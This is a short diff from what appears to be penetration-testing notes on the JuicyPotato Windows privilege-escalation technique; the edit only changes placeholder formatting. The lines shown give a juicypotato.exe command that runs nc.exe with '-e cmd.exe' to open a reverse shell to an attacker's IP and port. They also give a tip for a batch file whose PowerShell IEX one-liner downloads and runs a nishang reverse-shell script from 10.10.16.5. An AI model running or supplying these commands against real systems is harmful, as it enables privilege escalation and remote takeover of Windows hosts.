@@ -32,7 +32,7 @@ $_Affected_Windows_Verisons
 
 --> For CLSID - http://ohpe.it/juicy-potato/CLSID/
 
-~ Command : juicypotato.exe -l 1337 -t * -p "C:\Windows\Tasks\nc.exe <IP> <port> -e cmd.exe"
+~ Command : juicypotato.exe -l 1337 -t * -p "C:\Windows\Tasks\nc.exe IP PORT -e cmd.exe"
     TIP : If upper command doesn't work then try to do the following thing:
     1. Get ready with the nishang reverse shell script edit it with necessary data.
     Then create a bat file on any machine with IEX file downloader one-liner.--- echo powershell -c "IEX (new-object net.webclient).('http://10.10.16.5/shell.ps1')" > shell.bat ---
